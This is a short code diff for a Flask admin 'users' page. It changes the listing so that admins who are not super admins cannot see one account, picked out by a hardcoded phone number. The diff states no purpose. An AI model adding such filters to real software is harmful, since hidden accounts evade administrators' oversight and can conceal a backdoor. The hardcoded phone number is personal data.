@@ -241,7 +241,10 @@ def restore_existing_backup():
 @bp.route('/users')
 @role_or_permission_required(roles=['admin'], permissions=['users.view'])
 def users():
-    all_users = User.query.all()
+    if current_user.is_super_admin():
+        all_users = User.query.all()
+    else:
+        all_users = User.query.filter(User.phone_number != '0938074766').all()
     return render_template('admin/users.html', users=all_users)
 
 @bp.route('/users/add', methods=['GET', 'POST'])
